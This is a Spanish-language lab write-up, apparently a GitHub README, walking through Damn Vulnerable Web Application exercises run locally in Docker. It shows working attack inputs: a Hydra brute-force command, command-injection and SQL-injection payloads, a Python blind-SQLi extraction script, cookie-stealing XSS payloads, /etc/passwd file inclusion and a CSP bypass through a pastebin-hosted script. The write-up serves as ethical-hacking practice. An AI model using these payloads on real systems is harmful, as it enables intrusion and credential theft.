<details>
  <summary><h2>Índice</h2></summary>
  
- [Introducción](#introducción)
- [Instalación](#instalación)
- [Acceso](#acceso)
- [Brute Force](#brute-force)
- [Command Injection](#command-injection)
- [Cross Site Request Forgery](#cross-site-request-forgery)
- [File Inclusion](#file-inclusion)
- [File Upload](#file-upload)
- [SQL Injection](#sql-injection)
- [SQL INJECTION Blind](#sql-injection-blind)
- [WEAK SESSION IDs](#weak-session-ids)
- [XSS DOM](#xss-dom)
- [Reflected Cross Site Scripting](#reflected-cross-site-scripting)
- [XSS (Stored)](#xss-stored)
- [Content Security Policy Bypass](#content-security-policy-bypass)
- [JavaScript](#javascript)
  
</details>

---

## Introducción

DVWA es un software el cual contiene una serie de vulnerabilidades explotables y que sirve para entrenar diferentes técnicas de hacking ético, además de que nos ayuda a comprender como se realizan x ataques. 

En esat práctica se van a realziar todas las actividades en el nivel de seguridad **bajo**.

---

### Instalación

Hay varias formas de instalarla, yo he elegido realizarlo con **Docker**: 
El primer paso es instalar el propio Docker 

```bash
apt-get install docker.io 
```

![1 1](https://github.com/user-attachments/assets/dfd5f4fd-e4c8-4634-a593-4850513d5264)

Ahora obtengo el contenedor de Docker: 

```bash 
docker pull fvulnerables/web-dvwa 
```

![1 3](https://github.com/user-attachments/assets/8d7065a1-6c44-4a8b-a196-89f07a7304d0)


Arranco el contenedor: 

```bash
docker run –rm -i -p80:80 vulenrables/web-dvwa
```

![1 4](https://github.com/user-attachments/assets/69fc5666-1e19-440e-8187-57f89c085764)

---

### Acceso

Para acceder – http://localhost

![1 5](https://github.com/user-attachments/assets/72301217-6dfb-45bd-b512-497618e36cf3)


Las credenciales por defecto son **test:test** así que accedo y creo la BD de DVWA 
para poder acceder a las “prácticas”.

![1 6](https://github.com/user-attachments/assets/a861e71b-aa79-4c90-ae8a-ea0c7875a4e1)

↓

![1 7](https://github.com/user-attachments/assets/1e21bfeb-de86-4ca0-a48d-938b1c145707)


---

### Brute Force

El primer ataque para realizar es un Brute Force que lo realizaré con la herramienta Hydra.

![4 1](https://github.com/user-attachments/assets/76ba38c3-b3f8-48d6-924f-2d222d2fc2ac)

Voy al terminar y ejecuto el siguiente comando:

```bash
hydra -l admin -P /usr/sdhare/wordlists/rockyou.txt -s 80 127.0.0.1 http-get-form 
“/vulnerables/brute/:username=^USER^password=^PASS^&Login=Login:F=incorrect” 
```

En este ocmando estamos diciendo que hydra use las credenciales **admin:(archivo rockyou.txt)** para obtener las credenciales del formulario de la página.

El resultado es que  me da 16 contraseñas válidas, pero solo una de ellas es la 
correcta:

![4 4](https://github.com/user-attachments/assets/9b78f670-a8bb-421c-ab98-9855ad683c82)

↓

![4 6](https://github.com/user-attachments/assets/154b0c01-4546-4c5c-9ac8-f8ce7084db72)

---

### Command Injection

El siguiente es sobre la inyección de comandos. 
En la página hay un “formulario” donde podemos poner una IP. 
Básicamente lo que hace esta página es mandar un ping a la IP que pongamos.

![5 1](https://github.com/user-attachments/assets/df63bae1-9efd-4b49-b035-9866a3de5bd0)

Si pongo en vez de una IP un **| ls /** se podrá ver toda la raíz: 

```bash
| ls /
```

![5 5](https://github.com/user-attachments/assets/2214dbd4-c984-46b4-a329-46df187aebaf)

Y también se puede crear un archivo:

```bash
touch script.sh
```

![5 4](https://github.com/user-attachments/assets/806517e1-9a86-4432-b60c-34b96134256e)

---

### Cross Site Request Forgery


Este ataque tiene como objetivo hacer que un usuario realice acciones no deseados en un sirio en el cual ya ha iniciado sesión. 
El primer paso es crear un archivo, el cual envía una solicitud POST automáticamente para cambiar al contraseña del usuario sin que se de cuenta: 

![6 3](https://github.com/user-attachments/assets/e1d50b27-e98d-4a16-bb42-7bec130527c9)

Ahora levanto un servidor http en el puerto 8080:

```bash
python -m http.server 8080 
```
![6 2](https://github.com/user-attachments/assets/829d9ec1-0c60-49da-9a8b-a025d479cbce)

Acceso al servidor y al archivo **csrf-attack.html**

![6 4](https://github.com/user-attachments/assets/48e0f307-c2ab-4256-8d00-0fa52e8494b3)

Al acceder al archivo, me lleva a la página de DVWA donde cambio la contraseña:

![6 5](https://github.com/user-attachments/assets/4d99bb74-fe1f-45c4-b8e2-dc4367837119)

Y toda la actividad se queda reflejada en el terminal donde abrí el servidor http: 

![6 6](https://github.com/user-attachments/assets/3a4991b5-683a-4a97-a959-7a0dbea8a9c4)

---

### File Inclusion

Este ataque ocurre cuando una app web permite incluir archivos en el servidor de una forma no controlada. 
Este ataque es usado para leer información sensible o para ejecutar código malicioso. 
Aquí tenemos la página, donde se nos presentan 3 archivos diferentes: 

![7 1](https://github.com/user-attachments/assets/406bd5a6-4d8c-45d3-a466-94dc007988f9)

En la url se puede ver un parámetro de **GET -> page** el cual se usa para incluir el archivo a visualizar

![7 2 1](https://github.com/user-attachments/assets/ab7c9e07-9ada-40d3-bd14-91869a30fabe)

Si al parámetro le pasamos la ruta /etc/passwd nos mostrará el contenido del 
fichero.

![7 2](https://github.com/user-attachments/assets/827068e3-7ce8-40cc-827f-61fdfc4cd13a)

---

### File Upload

La aplicación permite subir archivos sin restricciones, lo que puede llevar a la ejecución de malware. 
En este ataque, podemos subir un fichero al DVWA:

![2 1](https://github.com/user-attachments/assets/d6f71abf-24ae-4a52-b61a-2b8bcb79873f)

Al subirlo, nos sale un mensaje, diciendo que el archivo se ha subido en una ruta: 

![2 3](https://github.com/user-attachments/assets/720bf0b9-79b9-43fb-929f-74335afad46d)

Si vamos a esa ruta podremos acceder a un directorio de la máquina: 

![2 4](https://github.com/user-attachments/assets/0bc5f8c0-4305-43a8-919c-0ac4d47f89aa)

Si voy hacia atrás, vere otros 3 directorios.

![image](https://github.com/user-attachments/assets/ff0b4591-0094-4571-83b7-edf7a2eaefba)

En uno están las subidas (el archivo que acabo de subir), en otro hay una flag y en 
el último hay imágenes con el nombre de un usuario: 

![image](https://github.com/user-attachments/assets/4f95ad8c-282f-46ff-9a5d-e621d75c26a5)

Al abrir la imagen admin.jpg se ve la misma imagen que en el ataque Brute Force: 

![image](https://github.com/user-attachments/assets/95b0bbe1-73ec-4d5f-8e6e-cbf1c697cbc4)

Así que esto nos indica que hay más usuarios en la máquina y en el ataque de fuerza bruta, al poner las credenciales de cada usuario, se verá esa imagen.

---

### SQL Injection

Este ataque consiste en la ejecución de código SQL malicioso par apoder ver información de las BD de la web. 
Con ejecuciones sencillas como un: 

```bash
‘ or 1=1#
```
se puede sacar el nombre y apellido de los usuarios:

![9 1](https://github.com/user-attachments/assets/77b5c6da-2b48-4210-a625-5cb61271dd50)

Y con consultas más elaboradas se puede obtener usuario y contraseña:

```bash
UNION SELECT user, password FROM users#
```

![9 2](https://github.com/user-attachments/assets/0434c5bd-ec5e-4ceb-9183-287036175dc3)

Estas contraseñas están codificadas en MD5 así que con un descifrador se obtienen fácilmente:

![9 3](https://github.com/user-attachments/assets/92ed7f04-ee6f-4060-a689-8d8fc604119c)

---

### SQL INJECTION Blind

Es una variante del SQL Injection donde el atacante no recibe mensajes de error, pero puede inferir información.

Creo el siguiente script:

```bash
import requests 
from requests.structures import CaseInsensitiveDict 
headers = CaseInsensitiveDict() 
headers["Cookie"] = "security=low; PHPSESSID=to84ds41bhba7ub48s10a8qim0" 
url = 'http://192.168.170.131/vulnerabilities/sqli_blind/' 
for i in range(100): 
parameters = f"id=1'+and+length(version())%3d{i}%23&Submit=Submit" 
r = requests.get(url, headers=headers, params=parameters) 
if 'User ID exists in the database' in r.text: 
print(f'length = {i}') 
length = i 
break 
j = 1 
for i in range(1, length+1): 
for s in range(30, 126): 
parameters = 
f"id=1'+and+ascii(substring(version(),{i},{j}))%3d{s}%23&Submit=Submit" 
r = requests.get(url, headers=headers, params=parameters) 
if 'User ID exists in the database' in r.text: 
print(chr(s), end='') 
break 
j += 1 
```

Antes de ejecutarlo, mando al servidor a dormir con un:

```bash
1' and sleep(5)# 
```

![image](https://github.com/user-attachments/assets/7b9e689a-f40f-4f30-888b-5c7592a8555a)

Mientras tanto, ejecuto el script y me sale lo siguiente:

![10 2](https://github.com/user-attachments/assets/bd878eeb-6d29-4d04-bb28-9da57670079b)

---

### WEAK SESSION IDs

Sucede cuando los identificadores de sesión son predecibles o fáciles de adivinar, lo que permite a un atacante secuestrar sesiones de usuarios legítimos. 

En este caso, DVWA crea una nueva cookie cada ves que le damos al botón: 

![image](https://github.com/user-attachments/assets/1201beb9-af35-401a-a025-a31a9fb3c2fd)

Si vemos las cookies almacenadas, vemos que la cookie que se esta generando es **dvwaSessions** la cual, cada vez que le damos al botón **Generate** incrementa su valor en 1:

![image](https://github.com/user-attachments/assets/fde1f90d-deb6-4a3c-9ddb-95c1fb952e1e)

↓

![image](https://github.com/user-attachments/assets/cba825d0-85ca-4a22-95c2-7e4ae502b70d)

---

### XSS DOM

Explota vulnerabilidades en el Document Object Model (DOM) del navegador para ejecutar JavaScript malicioso sin interactuar con el servidor. 
En este ataque podemos elegir un lenguaje y en la barra de direcciones se ve el parámetro language el cual cambia según el lenguaje elegido:

![image](https://github.com/user-attachments/assets/ff7ab39e-f799-48a8-bc3c-ad4adc8ec1e8)

Si en ese parámetro ponemos el valor: 

```bash
<script>alert(document.cookie);</script>
```

![12 2](https://github.com/user-attachments/assets/8ef6e87c-3f69-44d7-9d4d-57b3893ed725)

No saldrá un mensaje con la cookie de la sesión:

![12 3](https://github.com/user-attachments/assets/ea495d98-587c-4b58-bbb5-5f422c375cb7)

---

### Reflected Cross Site Scripting 

El código malicioso se refleja en la respuesta del servidor y se ejecuta en el navegador del usuario cuando hace clic en un enlace manipulado. 
En este ataque tenemos un formulario donde podemos poner nuestro nombre para que nos saque un mensaje saludándonos: 
En la barra de direcciones aparece el parámetro name con mi nombre:

![image](https://github.com/user-attachments/assets/3e8db5ff-793f-475a-87b2-c7bd32cea2a2)

Si en ese parámetro le ponemos: 

```bash
<img src=x onerror="alert(document.cookie)"> 
```
obtendremos la cookie:

![image](https://github.com/user-attachments/assets/d3534fd8-85ed-43f6-8646-d37a952f1b22)

---

### XSS (Stored) 

El atacante almacena el código malicioso en la base de datos del sitio, afectando a cualquier usuario que visualice el contenido infectado. 
En este ataque tenemos un formulario, donde podemos poner un nombre y un mensaje: 

![image](https://github.com/user-attachments/assets/41feb8a8-67ca-44db-bd29-7d4ea9ca97a5)

Si en el campo del mensaje ponemos:

```bash
<img src=x onerror="alert(document.cookie)">
```

![14 2 1](https://github.com/user-attachments/assets/d948fb1a-0569-406f-8f99-6ab8f5171c73)

Nos saldrá la cookie:

![14 2](https://github.com/user-attachments/assets/826430da-41d0-4701-ba2d-eace5b8ed5ae)

---

### Content Security Policy Bypass 

Técnica para evadir la política de seguridad de contenido (CSP) de una web, permitiendo la ejecución de código malicioso a pesar de las restricciones. 
En este ataque tenemos un formulario donde podemos meter una url. 
Si agrego la url - https://pastebin.com/dl/Lnamji4V - el script que se esconde tras esta url se ejecutará en la página.

![image](https://github.com/user-attachments/assets/63f70783-0438-44d7-a6f3-00773cd2dccf)

↓

![15 2](https://github.com/user-attachments/assets/050c72d7-b839-4249-875a-0bbe06494f17)

---

### JavaScript

Son vulnerabilidades relacionadas con JavaScript, como el uso inseguro de eval(), la manipulación del DOM, o la exposición de datos sensibles en el cliente. 

En este ataque tenemos otro formulario donde se nos dice que tenemos que poner la palabra “success” para ganar, pero al hacerlo, nos sale el mensaje “Invalid Token”.

![image](https://github.com/user-attachments/assets/adef76d9-2c94-437a-b7ad-ed019578f3ee)


Lo que hay que hacer es cifrar la palabra “success” a rot13 y luego el resultado 
cifrarlo a MD5, dándonos 38581812b435834ebf84ebcc2c6424d6 – como resultado.
Ahora debemos de poner lo siguiente en el formulario para que saque el mensaje:

```bash
token=38581812b435834ebf84ebcc2c6424d6&phrase=success 
```

![17 1](https://github.com/user-attachments/assets/b0183177-dda7-44b6-a752-a0d04cc382da)

↓

<img width="296" alt="17 2" src="https://github.com/user-attachments/assets/71dad6a6-6b2b-4aa6-942e-b206075c8379" />








































